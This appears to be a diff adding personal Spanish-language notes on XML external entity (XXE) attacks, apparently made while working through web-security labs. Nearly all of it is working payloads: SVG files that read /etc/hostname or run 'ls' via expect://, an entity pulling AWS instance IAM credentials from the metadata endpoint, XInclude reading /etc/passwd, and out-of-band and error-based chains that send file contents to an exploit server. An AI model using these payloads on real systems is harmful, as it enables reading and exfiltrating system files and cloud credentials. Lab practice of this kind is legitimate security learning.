@@ -1,0 +1,32 @@
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY teeek SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&teeek;</text></svg> --> hacemos un archivo svg y lo subimos, al abrir la imagen lo vemos
+
+Ejecutar comando en un svg
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+
+<!DOCTYPE foo [ <!ENTITY sexo SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> --> esto va debajo de xml version y &sexo; en una de las entidades
+
+<!DOCTYPE foo [ <!ENTITY sexo SYSTEM "http://collaborator.com"> ]>   --> añadir un +1 a los campos para saber cuál es vulnerable y poner &sexo;
+
+<!DOCTYPE foo [ <!ENTITY % sexo SYSTEM "http://collaborator.com"> %sexo;]> --> no nos deja añadir entidades, aplicamos % que delimita la variable
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo> --> cuando no haya xml ponerlo en un campo como productId
+
+Cuando podamos exfiltrar info
+En el exploit server
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % evaluamos "<!ENTITY &#x25; exfiltramos SYSTEM 'https://exploit-0a4a00b1038c74a58ae4778a015d0001.exploit-server.net/?x=%file;'>">
+esto a la petición donde el XML
+<!DOCTYPE foo [ <!ENTITY % sexo SYSTEM "https://exploitserver.com/exploit"> %sexo; %evaluamos; %exfiltramos;]>
+
+
+Cuando el archivo no exista
+En el exploit server
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % evaluamos "<!ENTITY &#x25; exfiltramos SYSTEM 'file:///noexiste/%file;'>">
+%evaluamos;
+%exfiltramos;
+esto a la petición donde el XML
+<!DOCTYPE foo [ <!ENTITY % sexo SYSTEM "https://exploitserver.com/exploit">  %sexo;]> 
+
